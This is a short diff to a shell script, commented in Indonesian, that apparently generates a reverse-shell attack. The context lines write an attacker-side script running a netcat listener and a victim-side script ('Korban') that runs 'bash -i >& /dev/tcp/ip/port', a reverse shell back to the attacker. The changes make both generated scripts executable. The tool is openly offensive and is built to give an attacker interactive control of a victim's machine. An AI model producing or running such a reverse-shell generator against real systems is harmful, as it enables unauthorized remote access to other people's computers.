@@ -63,7 +63,7 @@ echo "[*] Menjalankan netcat pada port ${port}..."
 sleep 3
 nc -lvnp ${port}
 EOF
-chmod +x "run.sh"
+chmod +x "${file_attacker}"
 
 # Membuat skrip yang akan dijalankan di mesin terget (Korban)
 cat <<EOF > "${output}"
@@ -71,6 +71,7 @@ cat <<EOF > "${output}"
 echo "Tunggu beberapa saat..."
 bash -i >& /dev/tcp/"${ip}"/"${port}" 0>&1
 EOF
+chmod +x "${output}"
 
 echo ""
 echo "[+] DONE..."
